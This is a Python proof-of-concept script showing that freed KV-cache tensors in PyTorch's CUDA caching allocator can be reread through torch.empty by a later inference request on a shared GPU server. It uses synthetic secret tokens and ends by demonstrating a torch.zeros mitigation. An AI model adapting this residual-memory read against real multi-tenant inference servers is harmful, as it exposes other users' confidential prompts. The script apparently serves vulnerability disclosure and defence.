"""
ML Inference KV-Cache Memory Leak PoC

Demonstrates how PyTorch's CUDACachingAllocator can cause KV-cache
data from one inference request to leak into the next request's buffer
in a shared inference server.

Attack scenario:
  Request A: user sends a confidential prompt, KV-cache is populated
  Request A finishes: tensors are freed back to pool (not zeroed)
  Request B: allocates new KV-cache buffers, gets the same memory
  Request B: reads Request A's KV-cache without any explicit copy

This is relevant for:
  - LLM serving frameworks (vLLM, TGI, SGLang) with tensor reuse
  - Batched inference where multiple users share GPU memory
  - LoRA serving where base model buffers are reused across adapters
"""

import torch
import sys


def simulate_inference_request(request_id: int, prompt_tokens: list,
                                 seq_len: int, n_heads: int,
                                 head_dim: int) -> dict:
    """Simulates allocating KV-cache for a single inference request."""
    # KV-cache shape: [seq_len, n_heads, head_dim]
    k_cache = torch.zeros(seq_len, n_heads, head_dim,
                          dtype=torch.float16, device="cuda")
    v_cache = torch.zeros(seq_len, n_heads, head_dim,
                          dtype=torch.float16, device="cuda")

    # Fill with "computed" values based on prompt tokens
    for i, token in enumerate(prompt_tokens[:seq_len]):
        k_cache[i] = float(token) * 0.01
        v_cache[i] = float(token) * 0.02

    torch.cuda.synchronize()
    return {
        "request_id": request_id,
        "k_cache": k_cache,
        "v_cache": v_cache,
        "k_ptr": k_cache.data_ptr(),
        "v_ptr": v_cache.data_ptr(),
    }


def main():
    if not torch.cuda.is_available():
        print("CUDA not available")
        sys.exit(1)

    print("=" * 60)
    print("ML Inference KV-Cache Memory Leak PoC")
    print(f"Device: {torch.cuda.get_device_name(0)}")
    print("=" * 60)

    SEQ_LEN  = 512
    N_HEADS  = 32
    HEAD_DIM = 128
    nbytes   = SEQ_LEN * N_HEADS * HEAD_DIM * 2  # fp16

    print(f"\nKV-cache size per request: {nbytes / 1024:.1f} KB (K) + "
          f"{nbytes / 1024:.1f} KB (V)")

    # ----------------------------------------------------------------
    # Step 1: Simulate Request A with a "confidential" prompt
    # ----------------------------------------------------------------
    print("\n[1] Request A arrives (confidential user prompt)...")
    SECRET_TOKENS = [31337, 42, 12345, 99999, 7777]
    req_a = simulate_inference_request(
        request_id=1,
        prompt_tokens=SECRET_TOKENS * (SEQ_LEN // len(SECRET_TOKENS) + 1),
        seq_len=SEQ_LEN, n_heads=N_HEADS, head_dim=HEAD_DIM
    )
    print(f"    K-cache ptr: 0x{req_a['k_ptr']:x}")
    print(f"    K[0,0,:4]:   {req_a['k_cache'][0, 0, :4].tolist()}")
    print(f"    V[0,0,:4]:   {req_a['v_cache'][0, 0, :4].tolist()}")

    # ----------------------------------------------------------------
    # Step 2: Request A finishes — tensors freed back to pool
    # ----------------------------------------------------------------
    print("\n[2] Request A completes — KV-cache freed back to pool...")
    k_ptr_a = req_a["k_ptr"]
    v_ptr_a = req_a["v_ptr"]
    del req_a
    torch.cuda.synchronize()
    print("    Tensors deleted (pool NOT zeroed by CUDACachingAllocator)")

    # ----------------------------------------------------------------
    # Step 3: Request B arrives — allocates new KV-cache
    # ----------------------------------------------------------------
    print("\n[3] Request B arrives (different user)...")
    # Allocate with torch.empty — no initialization, same pool
    k_new = torch.empty(SEQ_LEN, N_HEADS, HEAD_DIM,
                        dtype=torch.float16, device="cuda")
    v_new = torch.empty(SEQ_LEN, N_HEADS, HEAD_DIM,
                        dtype=torch.float16, device="cuda")
    torch.cuda.synchronize()

    k_ptr_b = k_new.data_ptr()
    v_ptr_b = v_new.data_ptr()
    print(f"    New K-cache ptr: 0x{k_ptr_b:x}")
    print(f"    Ptr reuse (K): {k_ptr_b == k_ptr_a}")
    print(f"    Ptr reuse (V): {v_ptr_b == v_ptr_a}")

    # ----------------------------------------------------------------
    # Step 4: Read what's in Request B's "empty" buffers
    # ----------------------------------------------------------------
    k_cpu = k_new.cpu().float()
    v_cpu = v_new.cpu().float()

    # Check if Request A's token pattern is visible
    expected_k0 = SECRET_TOKENS[0] * 0.01
    k_nonzero = (k_cpu.abs() > 1e-5).sum().item()
    k_total    = k_cpu.numel()

    # Check how much of the buffer has non-trivial values
    print(f"\n[4] Request B's 'empty' KV-cache contents:")
    print(f"    K non-zero elements: {k_nonzero} / {k_total} "
          f"({100.0*k_nonzero/k_total:.1f}%)")
    print(f"    K[0,0,:4]: {k_cpu[0, 0, :4].tolist()}")
    print(f"    V[0,0,:4]: {v_cpu[0, 0, :4].tolist()}")

    if k_ptr_b == k_ptr_a:
        # Same address — direct leak
        match = abs(k_cpu[0, 0, 0].item() - expected_k0) < 1e-3
        print(f"\n[!!!] SAME ADDRESS — KV-cache from Request A directly readable.")
        print(f"    Expected K[0,0,0] from secret token {SECRET_TOKENS[0]}: "
              f"{expected_k0:.6f}")
        print(f"    Got: {k_cpu[0,0,0].item():.6f}  Match: {match}")
    elif k_nonzero > k_total * 0.5:
        print(f"\n[~] Different address but buffer contains significant non-zero data.")
        print(f"    Memory pool residue visible ({100.0*k_nonzero/k_total:.1f}% non-zero)")
    else:
        print(f"\n[=] Pool returned different block. Limited residue visible.")
        print(f"    See pool_memory_leak.cu for confirmed raw pool leak.")

    # ----------------------------------------------------------------
    # Step 5: Mitigation demonstration
    # ----------------------------------------------------------------
    print("\n[5] Mitigation — using torch.zeros instead of torch.empty:")
    k_safe = torch.zeros(SEQ_LEN, N_HEADS, HEAD_DIM,
                         dtype=torch.float16, device="cuda")
    k_safe_nonzero = (k_safe.cpu().abs() > 1e-5).sum().item()
    print(f"    Non-zero elements: {k_safe_nonzero} / {k_safe.numel()} ✓")

    del k_new, v_new, k_safe
    print("\n[Done]")


if __name__ == "__main__":
    main()
